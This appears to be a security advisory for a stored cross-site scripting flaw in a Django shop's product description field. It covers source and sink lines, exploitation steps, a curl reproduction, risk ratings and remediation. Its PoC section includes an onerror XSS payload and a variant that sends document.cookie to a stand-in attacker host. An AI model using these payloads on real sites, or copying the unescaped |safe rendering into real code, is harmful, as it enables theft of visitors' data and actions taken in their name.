# Description

**CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')**, stored variant.

The article (CSS loader) `description` field is saved to the database without any HTML escaping and is later rendered on the public shop page with Django's `|safe` filter, which disables auto-escaping.

- **Sink (template):** `Shopping/templates/shop.html:313`
  ```django
  {% if css.description %}<p class="article-description">{{ css.description|safe }}</p>{% endif %}
  ```
  This sits inside the `{% for css in css_files %}` loop (line 302) that renders every listing card on `/shop/`.
- **Source (write path):** `Shopping/views.py:1306` in `add_article()`
  ```python
  description = request.POST.get('description', '').strip()
  ```
  The value is only whitespace-trimmed. It is never passed through `escape()` or any sanitiser, and it is saved verbatim at `Shopping/views.py:1362-1364` via `Css.objects.create(..., description=description, ...)`.

Neighbouring fields in the same view (`name`, `author`) are clipped but also not escaped, so the only thing standing between user input and the DOM is the auto-escape that `|safe` removes. `/shop/sell/` is the only code path that writes `Css.description`, so any account that can reach it can store a script that executes in the browser of every visitor to the shop.

**Who can reach the sink:** although the view's error message mentions a Developer role, `UserProfile` has no `role` field. The `profile.role` lookup at `Shopping/views.py:1289` raises `AttributeError`, which is caught by the `except Exception` branch (lines 1296-1300), and that branch only admits `is_staff` / `is_superuser` users. In practice the write therefore requires a **staff or superuser account**; buying the *Developer Role* in the Account Store does not unlock `/shop/sell/`. A regular (or Developer-role) user gets `302 Found` → `/shop/` with the message *"You need a Developer role to sell CSS files."*

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Obtain a staff or superuser account (e.g. a compromised or malicious staff member). Because `profile.role` does not exist, the `add_article` view falls back to the `is_staff`/`is_superuser` check (`Shopping/views.py:1287-1300`). | Account can access the seller form; non-staff users are redirected (`302` → `/shop/`). |
| 2 | Log in and open the seller form at `GET /shop/sell/` (route in `Shopping/urls.py:65`, mounted under `/shop/` by `djangoWocshack_5/urls.py:44`). | `add_article.html` form is displayed with the `description` textarea. |
| 3 | Submit `POST /shop/sell/` with the required fields (`name`, `css_content`, `author`) and the payload in `description`, for example `<img src=x onerror="alert(document.domain)">`. | `Css` row is created with the raw payload in `description`. The response is `302 Found` → `/shop/product/<uuid>/`. |
| 4 | Visit `GET /shop/` as any visitor, including unauthenticated ones (new listings are sorted first by default, `sort=-created_at`; `/shop/?search=<name>` also renders the card). | Shop template renders `{{ css.description\|safe }}` unescaped. The `<img>` tag fails to load `src=x` and the `onerror` handler runs in the victim's origin. |
| 5 | Replace the proof-of-concept with an action-performing payload (see PoC). | Attacker can read the non-HttpOnly `csrftoken` cookie (the `sessionid` cookie is `HttpOnly` and cannot be read), issue authenticated same-origin requests as the victim, or deface the shop. No `Content-Security-Policy` header is sent, so inline handlers are not blocked. |

# PoC

Minimal proof of execution, entered in the **description** field of the `/shop/sell/` form:

```html
<img src=x onerror="alert(document.domain)">
```

Data-exfiltration variant (for an authorised lab only):

```html
<img src=x onerror="fetch('https://attacker.example/collect?c='+encodeURIComponent(document.cookie))">
```

Reproduction with curl (replace the session cookie and CSRF token from a logged-in staff session):

```bash
curl -s -b dev.cookies -c dev.cookies -X POST http://localhost:8000/shop/sell/ \
  -H "Referer: http://localhost:8000/shop/sell/" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "name=Test Loader $RANDOM" \
  --data-urlencode "author=devuser" \
  --data-urlencode "price=0" \
  --data-urlencode 'description=<img src=x onerror="alert(document.domain)">' \
  --data-urlencode "css_content=.loader{color:red}"

# Verify the payload is emitted unescaped on the shop page
curl -s http://localhost:8000/shop/ | grep -o '<p class="article-description">.*</p>'
```

Expected output contains `<p class="article-description"><img src=x onerror="alert(document.domain)"></p>` with no `&lt;` encoding. Opening `/shop/` in a browser then shows the alert.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Script runs in the origin of `/shop/` for every visitor. The `sessionid` cookie is `HttpOnly`, so the session token itself cannot be stolen, but the `csrftoken` cookie and any data reachable through same-origin `fetch` (such as account pages) can be read and exfiltrated. Admin or staff visitors can be targeted to act with their privileges. |
| Integrity | Attacker-controlled JavaScript can submit state-changing requests as the victim (purchases, profile changes, role or listing edits), and can rewrite the shop page for all visitors. The payload is persistent, so each visit re-executes it. |
| Availability | A payload can redirect visitors, loop alerts, or break the shop page for everyone until the listing is removed or the description is cleaned up by an admin. |

Overall severity: **Medium** — the sink is persistent and reaches every shop visitor without interaction beyond loading the page, which is serious. It is rated Medium rather than High because the write requires a staff or superuser account (the Developer-role check is broken and falls back to `is_staff`/`is_superuser`), so exploitation needs a malicious or compromised staff member. The dev README records the CVSS 3.1 vector `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` (6.1); given the staff requirement observed on the live app, `PR:H` is more accurate.

# Remediation

1. **Restore Django's automatic HTML escaping** — remove the `|safe` filter from the article description rendering in `Shopping/templates/shop.html` and rely on Django's default auto-escaping (`{{ css.description }}`).
2. **Enforce server-side input validation** — validate the description type and maximum length in `Shopping/views.py` and preserve plain-text values without unnecessary HTML encoding before database storage.
3. **Ensure consistent output encoding** — review all rendering contexts of `Css.description` and ensure that existing and newly stored descriptions are rendered safely. Apply context-appropriate output encoding wherever required.
4. **Use HTML sanitisation only if rich-text descriptions are required** — use a maintained, parser-based HTML sanitisation library such as `nh3.clean()` with explicit allow-lists of permitted tags, attributes and URL schemes.
5. **Implement a restrictive Content-Security-Policy (CSP)** — configure `CONTENT_SECURITY_POLICY` in `docker-compose.yml` and update `REMOVE_HEADERS` to preserve the policy in the final HTTP response. Avoid `unsafe-inline`. CSP must remain a defence-in-depth measure.
6. **Maintain secure session cookie settings** — preserve `SESSION_COOKIE_HTTPONLY = True` and configure appropriate `Secure` and `SameSite` attributes according to deployment requirements. Cookie hardening is not a substitute for XSS prevention.
7. **Fix the broken authorisation check** — `UserProfile` has no `role` field, so `profile.role` in `add_article()` always fails and only staff can sell. If Developer-role users are meant to sell, check `PurchasedFeature.has_feature(request.user, 'developer_role')` as `Developer/views.py` does.
8. **Add regression tests** — extend `Shopping/tests.py` to verify that article descriptions are rendered as escaped text, existing stored descriptions remain safe, and legitimate description content is displayed correctly.

# Author
WOCSA
